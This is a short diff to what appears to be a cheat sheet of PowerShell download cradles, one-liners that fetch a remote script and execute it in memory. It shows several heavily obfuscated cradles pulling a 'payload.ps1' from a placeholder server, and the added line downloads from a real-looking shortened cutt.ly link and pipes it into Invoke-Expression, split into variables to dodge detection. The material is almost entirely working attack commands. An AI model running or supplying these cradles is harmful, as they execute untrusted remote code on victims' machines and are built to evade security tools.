@@ -8,6 +8,7 @@ ps> (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([
 # Windows PowerShell heavily obfuscated Cradle not proxy aware
 ps> $ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'*v*ip*'}).Name)((([Char[]][System.Net.WebClient]::New().DownloadData('http://server/payload.ps1'))-Join''))}
 ps> &( ([String]''.Normalize)[3,45,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://server/payload.ps1'))-Join'')
+ps> $url='https://cutt.ly/WS8Ve';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';$wc.$ds.Invoke($url)|Invoke-Expression
 
 
 # Proxy aware download cradles
